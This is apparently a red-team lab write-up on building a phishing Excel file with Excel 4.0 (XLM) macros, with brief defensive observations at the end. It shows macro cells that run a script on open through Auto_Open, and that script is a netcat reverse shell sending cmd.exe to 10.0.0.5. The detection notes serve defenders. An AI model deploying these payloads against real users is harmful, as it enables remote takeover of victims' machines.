# Phishing: XLM / Macro 4.0

This lab is based on the research performed by [Stan Hegt from Outflank](https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/).

## Weaponization

A Microsoft Excel Spreadsheet can be weaponized by firstly inserting a new sheet of type "MS Execel 4.0 Macro":

![](../../../.gitbook/assets/phishing-xlm-create-new.png)

We can then execute command by typing into the cells:

```text
=exec("c:\shell.cmd")
=halt()
```

As usual, the contents of shell.cmd is a simple netcat reverse shell:

{% code title="c:\\shell.cmd" %}
```csharp
C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
```
{% endcode %}

Note how we need to rename the `A1` cell to `Auto_Open` if we want the Macros to fire off once the document is opened:

![](../../../.gitbook/assets/phishing-xlm-auto-open.png)

{% file src="../../../.gitbook/assets/excel-4.0-macro-functions-reference-1.pdf" caption="Excel 4.0 Macro Functions Reference.pdf" %}

{% file src="../../../.gitbook/assets/phishing-xlm.xlsm" caption="XLM Phishing.xlsm" %}

## Execution

Opening the document and enabling Macros pops a reverse shell:

![](../../../.gitbook/assets/phishing-xlm-shell-auto-open.gif)

Note that XLM Macros allows using Win32 APIs, hence shellcode injection is also possible. See the original research link below for more info.

## Observations

As usual, look for any suspicious children originating from under the Excel.exe:

![](../../../.gitbook/assets/phishing-xlm-procexp.png)

Having a quick look at the file with a hex editor, we can see a suspicious string `shell.cmd` immediately, which is of course good news for defenders:

![](../../../.gitbook/assets/phishing-xlm-hex.png)

![](../../../.gitbook/assets/phishing-xlm-strings.png)

## References

{% embed url="https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/" %}

